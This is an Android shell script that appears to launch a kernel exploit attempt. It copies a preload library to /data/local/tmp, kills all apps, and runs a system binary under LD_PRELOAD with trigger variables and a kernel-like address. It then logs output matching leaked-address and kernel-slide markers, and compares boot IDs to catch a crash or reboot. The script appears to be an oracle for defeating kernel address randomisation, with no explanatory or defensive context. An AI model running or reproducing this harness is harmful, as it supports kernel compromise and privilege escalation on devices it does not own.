#!/system/bin/sh
# mt21 oracle: v37 拓扑 + 未映射 tree_pc (1 次尝试)
SRC=/sdcard/Documents/matisse_backup_essentials/preload_mt21.so
DST=/data/local/tmp/preload.so
LOG=/sdcard/Documents/matisse_backup_essentials/logs/mt21_oracle.txt
RUNLOG=/data/local/tmp/mt21_oracle_run.out
rm -f $DST; cp $SRC $DST; sync
echo "boot_before=$(cat /proc/sys/kernel/random/boot_id)" > $LOG
am kill-all 2>&1 | tail -1
rm -f $RUNLOG
timeout 140 env \
  PSELECT_SLIDE_TRIGGER=1 \
  PSELECT_V37=1 \
  PSELECT_TREE_PC=ffffffb0fffffff8 \
  PSELECT_TREE_LEFT=0 \
  PSELECT_SKIP_WARMUP=1 \
  LD_PRELOAD=$DST /system/bin/sleep 100 > $RUNLOG 2>&1
echo "run_rc=$?" >> $LOG
grep -a 'mt21:\|FCRQ\|FLPI\|SLIDE page\|bad leaked\|stext=' $RUNLOG | sed 's/\x1b\[[0-9;]*m//g' >> $LOG
echo "boot_after=$(cat /proc/sys/kernel/random/boot_id)" >> $LOG
echo "=== DONE ===" >> $LOG
